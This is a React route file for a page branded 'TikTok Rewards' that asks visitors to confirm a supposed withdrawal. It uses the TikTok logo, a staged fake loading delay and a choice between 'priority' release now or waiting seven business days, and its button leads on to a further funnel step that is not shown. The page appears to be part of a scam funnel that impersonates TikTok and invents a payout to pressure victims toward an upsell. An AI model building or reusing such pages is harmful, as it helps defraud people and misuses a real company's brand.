import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState, useEffect } from "react";
import tiktokLogo from "@/assets/tiktok-logo-clean.png.asset.json";

export const Route = createFileRoute("/obrigado2")({
  head: () => ({
    meta: [
      { title: "Confirmar retiro | TikTok Rewards" },
      {
        name: "description",
        content: "¿Deseas liberar tu retiro con prioridad ahora?",
      },
      { property: "og:title", content: "Confirmar retiro" },
      {
        property: "og:description",
        content: "¿Deseas liberar tu retiro con prioridad ahora?",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Obrigado2,
});

function Obrigado2() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const timer = setTimeout(() => {
      setLoading(false);
    }, 3500);
    return () => clearTimeout(timer);
  }, []);

  if (loading) {
    return (
      <main className="min-h-screen w-full bg-[#0a0a0a] flex items-center justify-center p-6 font-sans">
        <div className="w-full max-w-[400px] bg-[#121212] rounded-[24px] p-10 border border-white/5 flex flex-col items-center shadow-2xl">
          {/* Header */}
          <div className="flex items-center gap-2 mb-8">
             <div className="flex gap-1">
                <div className="w-2 h-2 rounded-full bg-[#25f4ee]" />
                <div className="w-2 h-2 rounded-full bg-[#ff3b5c]" />
             </div>
             <span className="text-white font-bold text-sm tracking-tight">TikTok Rewards</span>
          </div>

          {/* Progress Ring */}
          <div className="relative w-16 h-16 mb-8">
            <div className="absolute inset-0 rounded-full border-4 border-white/5" />
            <div className="absolute inset-0 rounded-full border-4 border-t-[#25f4ee] border-r-[#ff3b5c] animate-spin" />
          </div>

          {/* Text */}
          <h2 className="text-white text-[17px] font-bold mb-2">Preparando la siguiente etapa...</h2>
          <p className="text-neutral-500 text-[13px]">Espera um momento, por favor.</p>
        </div>
      </main>
    );
  }

  return (
    <main className="min-h-screen w-full bg-[#0a0a0a] flex flex-col items-center justify-center p-6 font-sans">
       <div className="w-full max-w-[450px] flex flex-col items-center">
          {/* Logo */}
          <img
            src={tiktokLogo.url}
            alt="TikTok"
            className="h-8 w-auto mb-12 brightness-0 invert opacity-80"
          />

          <div className="w-full bg-[#121212] rounded-[32px] p-10 border border-white/5 shadow-2xl text-center">
            <h1 className="text-white text-[28px] font-black leading-tight mb-6">
              ¿Deseas liberar tu retiro con <span className="text-[#25f4ee]">prioridad</span> ahora?
            </h1>
            
            <p className="text-neutral-400 text-[15px] leading-relaxed mb-10">
              Tu retiro está en proceso. Activa el envío prioritario para recibir tus fondos en minutos.
            </p>

            <button
              onClick={() => navigate({ to: "/obrigado3" })}
              className="w-full rounded-2xl bg-[#ff3b5c] py-5 text-[18px] font-black text-white shadow-[0_15px_35px_rgba(255,59,92,0.25)] transition-all hover:scale-[1.02] active:scale-[0.98]"
            >
              SÍ, CONFIRMAR
            </button>
          </div>

          {/* Back link */}
          <button className="mt-8 text-neutral-500 text-sm font-medium hover:text-neutral-300 transition-colors">
            No, esperar 7 días hábiles
          </button>
       </div>
    </main>
  );
}
